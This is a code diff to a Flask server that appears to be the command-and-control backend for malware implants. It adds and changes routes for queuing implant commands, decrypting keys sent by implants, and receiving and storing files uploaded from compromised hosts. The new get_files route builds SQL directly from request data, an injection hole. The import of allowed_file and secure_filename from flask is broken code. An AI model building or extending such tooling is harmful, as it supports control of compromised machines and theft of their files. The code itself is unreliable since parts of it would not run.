@@ -8,7 +8,7 @@ import SteganographyFixed
 import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
-                   request, url_for, send_file, send_from_directory)
+                   request, url_for, send_file, send_from_directory, allowed_file, secure_filename)
 from flask_cors import CORS, cross_origin
 from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                 get_jwt_identity, jwt_required,
@@ -87,8 +87,6 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant, with steg
-
-
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -127,8 +125,6 @@ def get_qcommands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant, in json
-
-
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -277,7 +273,9 @@ def new_symkey():
     try:
         if (request.content_length < 512):
             data = request.get_data()
-            print(data)
+            data = RsaDecryption.rsadecrypt(data)
+            for x in range(len(data)):
+                print(data[x])
             # print(len(data))
             datastr = data.decode("utf-8")
             for x in (range(len(datastr))):
@@ -418,13 +416,53 @@ def get_history():
         return e, {'Access-Control-Allow-Origin': '*'}
 
 
+#Displays files to client
+@app.route("/get_files", methods=["POST"])
+def get_files():
+    try: 
+        data = request.json
+        id = data['id']
+        query = (f"SELECT path from files where target_implant_id = {id}")
+
+        dbresp = tools.executeSelectQuery(query)
+
+        return dbresp, 200, {'Access-Control-Allow-Origin': '*'}
+    except Exception as e:
+        print(e)
+        return e, 405, {'Access-Control-Allow-Origin': '*'}
+
+    
+
+
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
     print("Recieved upload_file")
     try:
-        print(request.headers.get('id'))
-        file = request.files
-        print(file)
+        task_id = request.headers.get('taskid')
+        implant_id = request.headers.get('implant_id')
+        files = request.files
+        theFile = None
+        name = None
+        for x in files:
+            theFile = files[x] 
+            name = theFile.filename
+
+        print(task_id, implant_id, name)
+        print(type(theFile))
+
+        if name and allowed_file(name):
+            filename = secure_filename(name)
+            path = f"./{implant_id}"
+            path = os.path.join(path, filename)
+            theFile.save(path)
+            
+
+        columns = ['implant_id', 'file_name', 'path', 'task_id']
+        data = [implant_id, name, path, task_id]
+        print("About to insert query")
+        query = tools.insertQueryBuilder("files", columns, ['task_id'])
+        tools.executeInsertQuery(query, data) 
+
         print("recieved upload_files: \n Response: ")
         return "success", 200, {'Access-Control-Allow-Origin': '*'}
 
